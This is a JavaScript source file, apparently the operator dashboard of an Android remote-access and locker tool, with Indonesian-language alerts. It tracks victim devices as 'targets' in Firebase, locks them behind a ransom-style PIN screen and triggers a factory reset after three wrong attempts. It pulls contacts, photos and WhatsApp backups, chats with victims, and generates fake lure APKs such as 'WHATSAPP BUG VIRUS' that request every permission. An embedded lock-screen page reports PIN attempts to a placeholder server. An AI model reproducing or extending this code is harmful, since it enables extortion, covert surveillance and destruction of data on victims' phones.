// Check authentication
if (!sessionStorage.getItem('moonSoulAuth')) {
    window.location.href = 'index.html';
}

// Global variables
let currentTarget = null;
let targets = [];
let activeListeners = [];

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    // Set dev name
    document.getElementById('devName').textContent = sessionStorage.getItem('devUser') || 'Moon4.5';
    
    // Load targets
    loadTargets();
    
    // Set up real-time listeners
    setupRealtimeListeners();
    
    // Tab switching
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            this.classList.add('active');
            document.getElementById(this.dataset.tab + '-tab').classList.add('active');
        });
    });
    
    // Activate lock button
    document.getElementById('activateLock').addEventListener('click', activateLock);
    document.getElementById('deactivateLock').addEventListener('click', deactivateLock);
    document.getElementById('extractData').addEventListener('click', extractData);
    document.getElementById('generateApk').addEventListener('click', generateApk);
    document.getElementById('refreshTargets').addEventListener('click', loadTargets);
    document.getElementById('clearLogs').addEventListener('click', clearLogs);
    document.getElementById('sendChat').addEventListener('click', sendChatMessage);
    
    // App buttons
    document.querySelectorAll('.app-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            if (this.dataset.app === 'custom') {
                document.getElementById('customAppConfig').style.display = 'block';
            } else {
                document.getElementById('customAppConfig').style.display = 'none';
                document.getElementById('generateApk').dataset.selectedApp = this.dataset.app;
            }
        });
    });
});

function loadTargets() {
    db.collection('targets').onSnapshot((snapshot) => {
        targets = [];
        snapshot.forEach(doc => {
            targets.push({ id: doc.id, ...doc.data() });
        });
        
        updateTargetsUI();
        updateStats();
        addLog('TARGET LIST UPDATED: ' + targets.length + ' targets online', 'system');
    });
}

function updateTargetsUI() {
    const targetList = document.getElementById('targetList');
    targetList.innerHTML = '';
    
    targets.forEach(target => {
        const targetEl = document.createElement('div');
        targetEl.className = `target-item ${currentTarget && currentTarget.id === target.id ? 'selected' : ''}`;
        targetEl.dataset.id = target.id;
        
        const statusClass = target.locked ? 'status-locked' : 'status-online';
        
        targetEl.innerHTML = `
            <div class="target-name">${target.deviceName || 'Unknown Device'}</div>
            <div class="target-device">${target.model || 'Android'} | ${target.version || '10'}</div>
            <div class="target-status ${statusClass}"></div>
        `;
        
        targetEl.addEventListener('click', () => selectTarget(target));
        targetList.appendChild(targetEl);
    });
}

function selectTarget(target) {
    currentTarget = target;
    document.getElementById('selectedTarget').textContent = target.deviceName || 'TARGET SELECTED';
    
    // Enable chat
    document.getElementById('chatInput').disabled = false;
    document.getElementById('sendChat').disabled = false;
    
    // Load chat history
    loadChatHistory(target.id);
    
    addLog(`TARGET SELECTED: ${target.deviceName} (${target.id})`, 'system');
}

function activateLock() {
    if (!currentTarget) {
        alert('Pilih target dulu goblok!');
        return;
    }
    
    const message = document.getElementById('lockMessage').value;
    const pin = document.getElementById('lockPin').value;
    
    if (!message || !pin) {
        alert('Isi message dan pin dulu tolol!');
        return;
    }
    
    // Update target in Firestore
    db.collection('targets').doc(currentTarget.id).update({
        locked: true,
        lockMessage: message,
        lockPin: pin,
        lockTimestamp: firebase.firestore.FieldValue.serverTimestamp(),
        wrongAttempts: 0
    }).then(() => {
        addLog(`LOCK ACTIVATED on ${currentTarget.deviceName}`, 'success');
        document.getElementById('activateLock').disabled = true;
        document.getElementById('deactivateLock').disabled = false;
        
        // Simulate lock screen on target
        simulateLockScreen(currentTarget.id, message);
    });
}

function deactivateLock() {
    if (!currentTarget) return;
    
    db.collection('targets').doc(currentTarget.id).update({
        locked: false,
        lockMessage: null,
        lockPin: null
    }).then(() => {
        addLog(`LOCK RELEASED on ${currentTarget.deviceName}`, 'success');
        document.getElementById('activateLock').disabled = false;
        document.getElementById('deactivateLock').disabled = true;
    });
}

function simulateLockScreen(targetId, message) {
    // This would trigger the lock screen on the target device
    // For demo, we just log it
    addLog(`[SIMULATION] Lock screen displayed on target: "${message}"`, 'warning');
}

function extractData() {
    if (!currentTarget) {
        alert('Pilih target dulu!');
        return;
    }
    
    const checkboxes = document.querySelectorAll('.data-check:checked');
    if (checkboxes.length === 0) {
        alert('Pilih data yang mau di-extract!');
        return;
    }
    
    const selectedData = [];
    checkboxes.forEach(cb => {
        selectedData.push(cb.value);
    });
    
    addLog(`DATA EXTRACTION STARTED on ${currentTarget.deviceName}`, 'system');
    addLog(`Selected: ${selectedData.join(', ')}`, 'info');
    
    // Simulate extraction
    document.getElementById('dataPreview').innerHTML = '<h4>PREVIEW:</h4><pre>Extracting data...\n';
    
    let progress = 0;
    const interval = setInterval(() => {
        progress += 10;
        if (progress <= 100) {
            document.getElementById('dataPreview').innerHTML = `<h4>PREVIEW:</h4><pre>Extracting... ${progress}%\n`;
            
            if (progress === 30) {
                document.getElementById('dataPreview').innerHTML += 'Found 127 contacts\n';
            }
            if (progress === 60) {
                document.getElementById('dataPreview').innerHTML += 'Found 342 photos\n';
            }
            if (progress === 90) {
                document.getElementById('dataPreview').innerHTML += 'Found WhatsApp backup\n';
            }
        } else {
            clearInterval(interval);
            document.getElementById('dataPreview').innerHTML += '\nEXTRACTION COMPLETE!\nData saved to database.</pre>';
            addLog(`DATA EXTRACTION COMPLETE for ${currentTarget.deviceName}`, 'success');
        }
    }, 500);
}

function generateApk() {
    const selectedApp = this.dataset.selectedApp || 'aimlock';
    let appName = '';
    
    switch(selectedApp) {
        case 'aimlock':
            appName = 'AIMLOCK PRO v2.3';
            break;
        case 'money':
            appName = 'PENGHASIL UANG CEPAT';
            break;
        case 'whatsapp':
            appName = 'WHATSAPP GOLD TOOLS';
            break;
        case 'bug':
            appName = 'WHATSAPP BUG VIRUS';
            break;
        case 'game':
            appName = 'GAME PENGHASIL UANG';
            break;
        case 'custom':
            appName = document.getElementById('customAppName').value || 'CUSTOM APK';
            break;
    }
    
    addLog(`GENERATING FAKE APK: ${appName}`, 'system');
    
    // Simulate APK generation
    setTimeout(() => {
        addLog(`✅ APK GENERATED: ${appName}.apk (25.3 MB)`, 'success');
        addLog(`⚠️ This APK will request all permissions`, 'warning');
    }, 2000);
}

function sendChatMessage() {
    if (!currentTarget) {
        alert('Pilih target dulu!');
        return;
    }
    
    const message = document.getElementById('chatInput').value;
    if (!message) return;
    
    // Add to chat UI
    const chatMessages = document.getElementById('chatMessages');
    const msgEl = document.createElement('div');
    msgEl.className = 'dev-msg';
    msgEl.textContent = `DEV: ${message}`;
    chatMessages.appendChild(msgEl);
    chatMessages.scrollTop = chatMessages.scrollHeight;
    
    // Save to Firestore
    db.collection('targets').doc(currentTarget.id).collection('chats').add({
        from: 'dev',
        message: message,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
    });
    
    document.getElementById('chatInput').value = '';
    addLog(`Chat sent to ${currentTarget.deviceName}`, 'info');
}

function loadChatHistory(targetId) {
    db.collection('targets').doc(targetId).collection('chats')
        .orderBy('timestamp', 'asc')
        .onSnapshot((snapshot) => {
            const chatMessages = document.getElementById('chatMessages');
            chatMessages.innerHTML = '<div class="system-msg">[CHAT STARTED]</div>';
            
            snapshot.forEach(doc => {
                const data = doc.data();
                const msgEl = document.createElement('div');
                msgEl.className = data.from === 'dev' ? 'dev-msg' : 'target-msg';
                msgEl.textContent = data.from === 'dev' ? `DEV: ${data.message}` : `TARGET: ${data.message}`;
                chatMessages.appendChild(msgEl);
            });
            
            chatMessages.scrollTop = chatMessages.scrollHeight;
        });
}

function setupRealtimeListeners() {
    // Listen for wrong PIN attempts
    db.collection('events').where('type', '==', 'wrong_pin').onSnapshot((snapshot) => {
        snapshot.docChanges().forEach(change => {
            if (change.type === 'added') {
                const data = change.doc.data();
                addLog(`⚠️ WRONG PIN ATTEMPT on target ${data.targetId} (Attempt ${data.attempt}/3)`, 'error');
                
                if (data.attempt >= 3) {
                    addLog(`💀 TARGET ${data.targetId} DEVICE FACTORY RESET INITIATED`, 'error');
                    db.collection('targets').doc(data.targetId).update({
                        factoryReset: true,
                        locked: false
                    });
                }
            }
        });
    });
}

function addLog(message, type = 'info') {
    const logContainer = document.getElementById('logContainer');
    const logEntry = document.createElement('div');
    logEntry.className = `log-entry ${type}`;
    logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
    logContainer.appendChild(logEntry);
    logContainer.scrollTop = logContainer.scrollHeight;
}

function clearLogs() {
    document.getElementById('logContainer').innerHTML = '<div class="log-entry system">[SYSTEM] Logs cleared</div>';
}

function updateStats() {
    const online = targets.filter(t => !t.locked).length;
    const locked = targets.filter(t => t.locked).length;
    
    document.getElementById('targetsOnline').textContent = online;
    document.getElementById('activeLocks').textContent = locked;
    document.getElementById('dataExfil').textContent = (Math.random() * 100).toFixed(1) + ' MB';
}

// Lock screen simulation script (this would be on target device)
function generateLockScreenScript(targetId, message, pin) {
    return `
<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM LOCKED</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
            color: red;
            font-family: monospace;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .lock-container {
            text-align: center;
            border: 3px solid red;
            padding: 40px;
            max-width: 500px;
            background: #0a0a0a;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 20px red; }
            50% { box-shadow: 0 0 50px red; }
            100% { box-shadow: 0 0 20px red; }
        }
        h1 {
            font-size: 32px;
            margin-bottom: 20px;
        }
        .message {
            color: white;
            font-size: 18px;
            margin: 20px 0;
            white-space: pre-wrap;
        }
        .warning {
            color: yellow;
            margin: 20px 0;
        }
        input {
            padding: 15px;
            width: 200px;
            font-size: 20px;
            text-align: center;
            background: black;
            border: 2px solid red;
            color: red;
            margin: 10px 0;
        }
        button {
            padding: 15px 30px;
            background: red;
            color: black;
            border: none;
            font-size: 18px;
            cursor: pointer;
            margin-top: 10px;
        }
        .attempts {
            color: #ff4444;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="lock-container">
        <h1>🔒 DEVICE LOCKED 🔒</h1>
        <div class="message">${message}</div>
        <div class="warning">⚠️ WRONG PIN 3 TIMES = DEVICE RESET ⚠️</div>
        <input type="password" id="pinInput" maxlength="6" placeholder="ENTER PIN">
        <button onclick="checkPin()">UNLOCK</button>
        <div class="attempts" id="attemptDisplay">Attempts: 0/3</div>
    </div>
    
    <script>
        let attempts = 0;
        const correctPin = "${pin}";
        const targetId = "${targetId}";
        
        function checkPin() {
            const pin = document.getElementById('pinInput').value;
            if (pin === correctPin) {
                window.location.href = 'device_unlocked.html';
            } else {
                attempts++;
                document.getElementById('attemptDisplay').textContent = \`Attempts: \${attempts}/3\`;
                document.getElementById('pinInput').value = '';
                
                // Report wrong attempt to server
                fetch('https://your-server.com/api/wrong-pin', {
                    method: 'POST',
                    body: JSON.stringify({
                        targetId: targetId,
                        attempt: attempts
                    })
                });
                
                if (attempts >= 3) {
                    document.body.innerHTML = '<div style="color:red;text-align:center;margin-top:50vh;"><h1>💀 DEVICE WIPED 💀</h1><p>Factory reset initiated</p></div>';
                    // Actual factory reset simulation
                    setTimeout(() => {
                        window.location.href = 'about:blank';
                    }, 3000);
                }
            }
        }
    </script>
</body>
</html>
    `;
                                                          }
